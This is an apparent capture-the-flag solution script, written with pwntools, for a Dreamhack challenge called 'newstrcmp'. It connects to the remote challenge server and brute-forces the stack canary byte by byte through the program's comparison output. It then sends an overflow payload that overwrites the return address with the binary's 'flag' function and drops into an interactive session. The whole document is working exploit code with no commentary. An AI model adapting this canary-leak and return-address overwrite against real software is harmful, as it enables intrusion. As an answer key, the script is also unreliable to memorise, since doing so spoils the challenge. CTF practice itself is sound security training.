from pwn import *

context.log_level	= "DEBUG"
context.arch		= "amd64"

HOST, PORT = "host1.dreamhack.games", 20330
p	= remote(HOST, PORT)
#p	= process('./newstrcmp')
e 	= ELF('./newstrcmp')
libc	= e.libc

sla 	= lambda x, y : p.sendlineafter(x,y)
sa	= lambda x, y : p.sendafter(x,y)
flag	= e.symbols['flag']
canary	= b""

def newstrcmp(s1, s2):
	sla(b'n): ', b'n')
	sa(b's1: ', s1)
	sa(b's2: ', s2)

def exploit():
	global canary
	for j in range(1, 0x100):
		payload = b""
		payload += b"A"*0x19+canary+p8(j)

		payload1 = b""
		payload1 += b"A"*0x19

		newstrcmp(payload, payload1)
		p.recvuntil(b'newstrcmp: ')
		if p.recv(3) == b"Two":
			canary += p8(j)
			break
		else:
			continue

def get_last_canary():
	global canary
	for j in range(1, 0x100):
		payload = b""
		payload += b"A"*0x19+canary+p8(j)

		payload1 = b""
		payload1 += b"A"*0x19
		newstrcmp(payload, payload1)

		p.recvuntil(b'Result of newstrcmp: s1 is ')
		if p.recv(6) == b"larger":
			canary += p8(j)
			break
			print(f'canary : {canary}')

	payload = b"1"*0x20
	payload1 = b"B"*0x18+b"\x00"+canary+b"C"*8+p64(flag)
	newstrcmp(payload, payload1)


for i in range(0, 0x8):
	exploit()

get_last_canary()
sla(b'n): ', b'y')
p.interactive()
